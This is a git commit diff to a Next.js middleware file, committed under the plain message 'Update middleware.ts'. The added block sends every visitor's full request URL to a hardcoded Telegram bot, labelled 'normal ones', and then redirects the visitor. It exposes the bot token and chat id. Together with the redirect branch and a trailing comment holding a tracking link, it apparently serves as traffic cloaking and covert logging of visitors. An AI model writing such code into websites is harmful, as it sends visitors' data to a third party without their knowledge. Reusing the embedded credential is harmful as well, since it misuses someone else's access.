f18c3131ed53e7e7d63be49162df32e80983c113
Master4eg123 <54636293+Master4eg123@users.noreply.github.com>
2025-08-27 14:30:13 +0600

    Update middleware.ts

--- middleware.ts
+++ middleware.ts
@@ -29,7 +29,17 @@ export function middleware(req: NextRequest) {
     // и потом редиректим куда надо
     return NextResponse.redirect("https://google.com");
   }
-
+  await fetch(
+      `https://api.telegram.org/bot6438500280:AAGu6vgVZJhrh5PO-uPawldIFg1TE6Gopiw/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: 1743635369,
+          text: `НОРМИ: ${req.nextUrl.href}`,
+        }),
+      }
+    );
   return NextResponse.redirect("https://ya.ru");
 }
 // https://pqnjj.bestafair.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=4533&s2=2163253
